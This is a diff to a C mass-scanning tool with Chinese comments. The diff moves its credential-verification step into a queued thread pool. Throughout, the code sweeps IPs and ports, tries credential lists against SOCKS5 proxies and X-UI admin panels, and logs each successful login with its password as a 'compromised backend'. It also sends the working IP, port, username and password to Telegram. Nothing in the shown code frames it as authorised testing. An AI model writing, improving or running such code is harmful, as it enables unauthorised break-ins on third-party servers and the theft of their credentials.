@@ -1,6 +1,21 @@
 #include "saia.h"
 
 static volatile int running_threads = 0;
+static volatile int verify_running_threads = 0;
+static volatile int feeding_in_progress = 0;
+static volatile int pending_verify_tasks = 0;
+
+typedef struct verify_task_s {
+    char ip[64];
+    uint16_t port;
+    credential_t *creds;
+    size_t cred_count;
+    int work_mode;
+    struct verify_task_s *next;
+} verify_task_t;
+
+static verify_task_t *verify_head = NULL;
+static verify_task_t *verify_tail = NULL;
 #ifdef _WIN32
 static HANDLE lock_stats;
 static HANDLE lock_file;
@@ -20,6 +35,18 @@ static pthread_mutex_t lock_file = PTHREAD_MUTEX_INITIALIZER;
 #else
 #define SAIA_STRTOK_R strtok_r
 #endif
+
+static int clamp_positive_threads(int threads) {
+    return (threads > 0) ? threads : 1;
+}
+
+static int verify_reserved_threads(void) {
+    int total = clamp_positive_threads(g_config.threads);
+    int reserve = (total * 30 + 99) / 100; /* ceil(total * 0.3) */
+    if (reserve < 1) reserve = 1;
+    if (reserve > total) reserve = total;
+    return reserve;
+}
 
 // 初始化锁
 void init_locks() {
@@ -199,6 +226,250 @@ typedef struct {
     int work_mode;
 } worker_arg_t;
 
+static void scanner_report_found_open(const worker_arg_t *task) {
+    if (!task) return;
+    char result_line[1024];
+    const char *tag = (task->work_mode == MODE_S5) ? "[S5_FOUND]" :
+                      (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) ? "[XUI_FOUND]" :
+                      "[PORT_OPEN]";
+    snprintf(result_line, sizeof(result_line),
+             "%s %s:%d | 端口开放",
+             tag, task->ip, task->port);
+    MUTEX_LOCK(lock_file);
+    file_append(g_config.report_file, result_line);
+    file_append(g_config.report_file, "\n");
+    printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
+    MUTEX_UNLOCK(lock_file);
+}
+
+static void scanner_run_verify_logic(const verify_task_t *task) {
+    if (!task) return;
+
+    if (task->work_mode == MODE_S5) {
+        for (size_t i = 0; i < task->cred_count; i++) {
+            if (verify_socks5(task->ip, task->port, task->creds[i].username, task->creds[i].password, 3000)) {
+                MUTEX_LOCK(lock_stats);
+                g_state.total_verified++;
+                g_state.s5_verified++;
+                MUTEX_UNLOCK(lock_stats);
+
+                char result_line[1024];
+                snprintf(result_line, sizeof(result_line),
+                         "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
+                         task->ip, task->port,
+                         task->creds[i].username, task->creds[i].password);
+
+                MUTEX_LOCK(lock_file);
+                file_append(g_config.report_file, result_line);
+                file_append(g_config.report_file, "\n");
+                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
+                MUTEX_UNLOCK(lock_file);
+
+                char msg[1024];
+                snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>",
+                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                push_telegram(msg);
+                break;
+            }
+        }
+        return;
+    }
+
+    if (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) {
+        int found = 0;
+        for (size_t i = 0; i < task->cred_count; i++) {
+            if (verify_xui(task->ip, task->port,
+                           task->creds[i].username, task->creds[i].password, 3000)) {
+                MUTEX_LOCK(lock_stats);
+                g_state.total_verified++;
+                g_state.xui_verified++;
+                MUTEX_UNLOCK(lock_stats);
+
+                char result_line[1024];
+                snprintf(result_line, sizeof(result_line),
+                         "[XUI_VERIFIED] [高危-后台沦陷] %s:%d | 账号:%s | 密码:%s | 登录成功",
+                         task->ip, task->port,
+                         task->creds[i].username, task->creds[i].password);
+                MUTEX_LOCK(lock_file);
+                file_append(g_config.report_file, result_line);
+                file_append(g_config.report_file, "\n");
+                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
+                MUTEX_UNLOCK(lock_file);
+
+                char msg[1024];
+                snprintf(msg, sizeof(msg), "<b>[XUI_VERIFIED] 高危漏洞触发</b>\nURL: <code>http://%s:%d</code>\n账号: <code>%s</code>\n密码: <code>%s</code>",
+                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                push_telegram(msg);
+
+                found = 1;
+                break;
+            }
+        }
+
+        if (task->work_mode == MODE_DEEP && !found) {
+            for (size_t i = 0; i < task->cred_count; i++) {
+                if (verify_socks5(task->ip, task->port,
+                                  task->creds[i].username, task->creds[i].password, 3000)) {
+                    MUTEX_LOCK(lock_stats);
+                    g_state.total_verified++;
+                    g_state.s5_verified++;
+                    MUTEX_UNLOCK(lock_stats);
+
+                    char result_line[1024];
+                    snprintf(result_line, sizeof(result_line),
+                             "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
+                             task->ip, task->port,
+                             task->creds[i].username, task->creds[i].password);
+                    MUTEX_LOCK(lock_file);
+                    file_append(g_config.report_file, result_line);
+                    file_append(g_config.report_file, "\n");
+                    printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
+                    MUTEX_UNLOCK(lock_file);
+
+                    char msg[1024];
+                    snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>",
+                             task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                    push_telegram(msg);
+                    break;
+                }
+            }
+        }
+        return;
+    }
+
+    if (task->work_mode == MODE_VERIFY) {
+        for (size_t i = 0; i < task->cred_count; i++) {
+            int ok = verify_xui(task->ip, task->port,
+                                task->creds[i].username, task->creds[i].password, 3000);
+            if (!ok) ok = verify_socks5(task->ip, task->port,
+                                         task->creds[i].username, task->creds[i].password, 3000);
+            if (ok) {
+                MUTEX_LOCK(lock_stats);
+                g_state.total_verified++;
+                MUTEX_UNLOCK(lock_stats);
+
+                char result_line[1024];
+                snprintf(result_line, sizeof(result_line),
+                         "[VERIFIED] %s:%d | 账号:%s | 密码:%s",
+                         task->ip, task->port,
+                         task->creds[i].username, task->creds[i].password);
+                MUTEX_LOCK(lock_file);
+                file_append(g_config.report_file, result_line);
+                file_append(g_config.report_file, "\n");
+                printf("\n%s%s%s\n", C_HOT, result_line, C_RESET);
+                MUTEX_UNLOCK(lock_file);
+                break;
+            }
+        }
+    }
+}
+
+static void scanner_enqueue_verify_task(const worker_arg_t *task) {
+    if (!task) return;
+
+    verify_task_t *vt = (verify_task_t *)malloc(sizeof(verify_task_t));
+    if (!vt) return;
+    memset(vt, 0, sizeof(*vt));
+    strncpy(vt->ip, task->ip, sizeof(vt->ip) - 1);
+    vt->port = task->port;
+    vt->creds = task->creds;
+    vt->cred_count = task->cred_count;
+    vt->work_mode = task->work_mode;
+
+    MUTEX_LOCK(lock_stats);
+    vt->next = NULL;
+    if (verify_tail) {
+        verify_tail->next = vt;
+    } else {
+        verify_head = vt;
+    }
+    verify_tail = vt;
+    pending_verify_tasks++;
+    MUTEX_UNLOCK(lock_stats);
+}
+
+static int scanner_verify_cap_now(int scans_now, int feeding_now) {
+    int reserve = verify_reserved_threads();
+    if (feeding_now || scans_now > 0) return reserve;
+    return clamp_positive_threads(g_config.threads);
+}
+
+#ifdef _WIN32
+static unsigned __stdcall verify_worker_thread(void *arg) {
+#else
+static void *verify_worker_thread(void *arg) {
+#endif
+    verify_task_t *task = (verify_task_t *)arg;
+    scanner_run_verify_logic(task);
+    free(task);
+
+    MUTEX_LOCK(lock_stats);
+    if (verify_running_threads > 0) verify_running_threads--;
+    MUTEX_UNLOCK(lock_stats);
+
+#ifdef _WIN32
+    return 0;
+#else
+    return NULL;
+#endif
+}
+
+static void scanner_pump_verify_workers(void) {
+    while (1) {
+        verify_task_t *task = NULL;
+        int can_start = 0;
+
+        MUTEX_LOCK(lock_stats);
+        int total_threads = clamp_positive_threads(g_config.threads);
+        int scans_now = running_threads;
+        int feeding_now = feeding_in_progress;
+        int verify_cap = scanner_verify_cap_now(scans_now, feeding_now);
+        int total_running = running_threads + verify_running_threads;
+
+        if (pending_verify_tasks > 0 && verify_head &&
+            verify_running_threads < verify_cap &&
+            total_running < total_threads) {
+            task = verify_head;
+            verify_head = verify_head->next;
+            if (!verify_head) verify_tail = NULL;
+            pending_verify_tasks--;
+            verify_running_threads++;
+            can_start = 1;
+        }
+        MUTEX_UNLOCK(lock_stats);
+
+        if (!can_start || !task) break;
+
+#ifdef _WIN32
+        uintptr_t tid = _beginthreadex(NULL, 0, verify_worker_thread, task, 0, NULL);
+        if (tid == 0) {
+            MUTEX_LOCK(lock_stats);
+            verify_running_threads--;
+            pending_verify_tasks++;
+            task->next = verify_head;
+            verify_head = task;
+            if (!verify_tail) verify_tail = task;
+            MUTEX_UNLOCK(lock_stats);
+            break;
+        }
+        CloseHandle((HANDLE)tid);
+#else
+        pthread_t tid;
+        if (pthread_create(&tid, NULL, verify_worker_thread, task) != 0) {
+            MUTEX_LOCK(lock_stats);
+            verify_running_threads--;
+            pending_verify_tasks++;
+            task->next = verify_head;
+            verify_head = task;
+            if (!verify_tail) verify_tail = task;
+            MUTEX_UNLOCK(lock_stats);
+            break;
+        }
+        pthread_detach(tid);
+#endif
+    }
+}
+
 // 工作线程函数
 #ifdef _WIN32
 unsigned __stdcall worker_thread(void *arg) {
@@ -206,9 +477,6 @@ unsigned __stdcall worker_thread(void *arg) {
 void *worker_thread(void *arg) {
 #endif
     worker_arg_t *task = (worker_arg_t *)arg;
-    int found = 0;
-    (void)found; /* suppress unused-variable warning */
-    
     // 更新扫描统计
     MUTEX_LOCK(lock_stats);
     g_state.total_scanned++;
@@ -251,142 +519,13 @@ void *worker_thread(void *arg) {
     /* scan_mode: 1=探索(只扫描存活), 2=探索+验真, 3=只留极品(只保留验证通过的) */
     int do_verify = (g_config.scan_mode >= SCAN_EXPLORE_VERIFY);
 
-    /* === 探索模式: 只记录端口开放 === */
-    if (!do_verify) {
-        char result_line[1024];
-        const char *tag = (task->work_mode == MODE_S5) ? "[S5_FOUND]" :
-                          (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) ? "[XUI_FOUND]" :
-                          "[PORT_OPEN]";
-        snprintf(result_line, sizeof(result_line),
-                 "%s %s:%d | 端口开放",
-                 tag, task->ip, task->port);
-        MUTEX_LOCK(lock_file);
-        file_append(g_config.report_file, result_line);
-        file_append(g_config.report_file, "\n");
-        printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
-        MUTEX_UNLOCK(lock_file);
-        goto done;
+    scanner_report_found_open(task);
+
+    if (do_verify) {
+        scanner_enqueue_verify_task(task);
+        scanner_pump_verify_workers();
     }
 
-    /* === 验真模式 === */
-    if (task->work_mode == MODE_S5) {
-        for (size_t i = 0; i < task->cred_count; i++) {
-            if (verify_socks5(task->ip, task->port, task->creds[i].username, task->creds[i].password, 3000)) {
-                found = 1;
-                
-                MUTEX_LOCK(lock_stats);
-                g_state.total_verified++;
-                g_state.s5_verified++;
-                MUTEX_UNLOCK(lock_stats);
-                
-                // 记录结果
-                char result_line[1024];
-                snprintf(result_line, sizeof(result_line), 
-                         "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s", 
-                         task->ip, task->port, 
-                         task->creds[i].username, task->creds[i].password);
-                         
-                MUTEX_LOCK(lock_file);
-                file_append(g_config.report_file, result_line);
-                file_append(g_config.report_file, "\n");
-                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
-                MUTEX_UNLOCK(lock_file);
-                
-                // 推送TG
-                char msg[1024];
-                snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>", 
-                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
-                push_telegram(msg);
-                
-                break; // 找到一个密码就停止
-            }
-        }
-    } else if (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) {
-        /* XUI 专项 / 深度全能：遍历所有凭据 */
-        for (size_t i = 0; i < task->cred_count; i++) {
-            if (verify_xui(task->ip, task->port,
-                           task->creds[i].username, task->creds[i].password, 3000)) {
-                MUTEX_LOCK(lock_stats);
-                g_state.total_verified++;
-                g_state.xui_verified++;
-                MUTEX_UNLOCK(lock_stats);
-
-                char result_line[1024];
-                snprintf(result_line, sizeof(result_line),
-                         "[XUI_VERIFIED] [高危-后台沦陷] %s:%d | 账号:%s | 密码:%s | 登录成功",
-                         task->ip, task->port,
-                         task->creds[i].username, task->creds[i].password);
-                MUTEX_LOCK(lock_file);
-                file_append(g_config.report_file, result_line);
-                file_append(g_config.report_file, "\n");
-                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
-                MUTEX_UNLOCK(lock_file);
-
-                // 推送TG
-                char msg[1024];
-                snprintf(msg, sizeof(msg), "<b>[XUI_VERIFIED] 高危漏洞触发</b>\nURL: <code>http://%s:%d</code>\n账号: <code>%s</code>\n密码: <code>%s</code>", 
-                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
-                push_telegram(msg);
-
-                found = 1;
-                break;
-            }
-        }
-        /* 深度全能额外跑一遍 S5 */
-        if (task->work_mode == MODE_DEEP && !found) {
-            for (size_t i = 0; i < task->cred_count; i++) {
-                if (verify_socks5(task->ip, task->port,
-                                   task->creds[i].username, task->creds[i].password, 3000)) {
-                    MUTEX_LOCK(lock_stats);
-                    g_state.total_verified++;
-                    g_state.s5_verified++;
-                    MUTEX_UNLOCK(lock_stats);
-                    char result_line[1024];
-                    snprintf(result_line, sizeof(result_line),
-                             "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
-                             task->ip, task->port,
-                             task->creds[i].username, task->creds[i].password);
-                    MUTEX_LOCK(lock_file);
-                    file_append(g_config.report_file, result_line);
-                    file_append(g_config.report_file, "\n");
-                    printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
-                    MUTEX_UNLOCK(lock_file);
-                    
-                    char msg[1024];
-                    snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>",
-                             task->ip, task->port, task->creds[i].username, task->creds[i].password);
-                    push_telegram(msg);
-                    break;
-                }
-            }
-        }
-    } else if (task->work_mode == MODE_VERIFY) {
-        /* 验真模式：同时尝试 XUI + S5 */
-        for (size_t i = 0; i < task->cred_count; i++) {
-            int ok = verify_xui(task->ip, task->port,
-                                task->creds[i].username, task->creds[i].password, 3000);
-            if (!ok) ok = verify_socks5(task->ip, task->port,
-                                         task->creds[i].username, task->creds[i].password, 3000);
-            if (ok) {
-                MUTEX_LOCK(lock_stats);
-                g_state.total_verified++;
-                MUTEX_UNLOCK(lock_stats);
-                char result_line[1024];
-                snprintf(result_line, sizeof(result_line),
-                         "[VERIFIED] %s:%d | 账号:%s | 密码:%s",
-                         task->ip, task->port,
-                         task->creds[i].username, task->creds[i].password);
-                MUTEX_LOCK(lock_file);
-                file_append(g_config.report_file, result_line);
-                file_append(g_config.report_file, "\n");
-                printf("\n%s%s%s\n", C_HOT, result_line, C_RESET);
-                MUTEX_UNLOCK(lock_file);
-                break;
-            }
-        }
-    }
-
-done:
     
     free(task);
     
@@ -585,6 +724,8 @@ static int feed_single_target(const char *ip, void *userdata) {
     for (size_t p = 0; p < ctx->port_count && g_running && !g_reload; p++) {
         ctx->current_port = ctx->ports[p];
         while (g_running && !g_reload) {
+            scanner_pump_verify_workers();
+
             if (g_config.backpressure.enabled) {
                 backpressure_update(&g_config.backpressure);
                 if (backpressure_should_throttle(&g_config.backpressure)) {
@@ -592,10 +733,11 @@ static int feed_single_target(const char *ip, void *userdata) {
                     continue;
                 }
             }
+
             MUTEX_LOCK(lock_stats);
-            int cur = running_threads;
+            int cur = running_threads + verify_running_threads;
             MUTEX_UNLOCK(lock_stats);
-            if (cur < g_config.threads) break;
+            if (cur < clamp_positive_threads(g_config.threads)) break;
             saia_sleep(5);
         }
         if (!g_running || g_reload) break;
@@ -873,6 +1015,18 @@ void scanner_start_streaming(char **raw_lines, size_t raw_count,
                              uint16_t *ports, size_t port_count) {
     init_locks();
 
+    MUTEX_LOCK(lock_stats);
+    while (verify_head) {
+        verify_task_t *next = verify_head->next;
+        free(verify_head);
+        verify_head = next;
+    }
+    verify_tail = NULL;
+    verify_running_threads = 0;
+    pending_verify_tasks = 0;
+    feeding_in_progress = 0;
+    MUTEX_UNLOCK(lock_stats);
+
     /* 快速估算总目标数 — 不做真正展开，只算数目 */
     size_t est_total = 0;
     for (size_t i = 0; i < raw_count; i++) {
@@ -944,6 +1098,10 @@ void scanner_start_streaming(char **raw_lines, size_t raw_count,
     feed_ctx.current_ip[0] = '\0';
     feed_ctx.current_port = 0;
 
+    MUTEX_LOCK(lock_stats);
+    feeding_in_progress = 1;
+    MUTEX_UNLOCK(lock_stats);
+
     /* skip caches are preloaded once per audit session */
     write_scan_progress(&feed_ctx, "running");
 
@@ -963,12 +1121,19 @@ void scanner_start_streaming(char **raw_lines, size_t raw_count,
         }
     }
 
+    MUTEX_LOCK(lock_stats);
+    feeding_in_progress = 0;
+    MUTEX_UNLOCK(lock_stats);
+
     /* 等待剩余线程 */
     while (1) {
+        scanner_pump_verify_workers();
         MUTEX_LOCK(lock_stats);
         int remaining = running_threads;
+        int verifying = verify_running_threads;
+        int queued = pending_verify_tasks;
         MUTEX_UNLOCK(lock_stats);
-        if (remaining <= 0) break;
+        if (remaining <= 0 && verifying <= 0 && queued <= 0) break;
         saia_sleep(200);
     }
 
@@ -990,6 +1155,18 @@ void scanner_start_streaming(char **raw_lines, size_t raw_count,
 // 占位符接口实现
 int scanner_init(void) { return 0; }
 void scanner_cleanup(void) {
+    MUTEX_LOCK(lock_stats);
+    while (verify_head) {
+        verify_task_t *next = verify_head->next;
+        free(verify_head);
+        verify_head = next;
+    }
+    verify_tail = NULL;
+    pending_verify_tasks = 0;
+    verify_running_threads = 0;
+    feeding_in_progress = 0;
+    MUTEX_UNLOCK(lock_stats);
+
     target_set_free(&g_resume_cache);
     target_set_free(&g_history_cache);
     memset(&g_resume_cache, 0, sizeof(g_resume_cache));
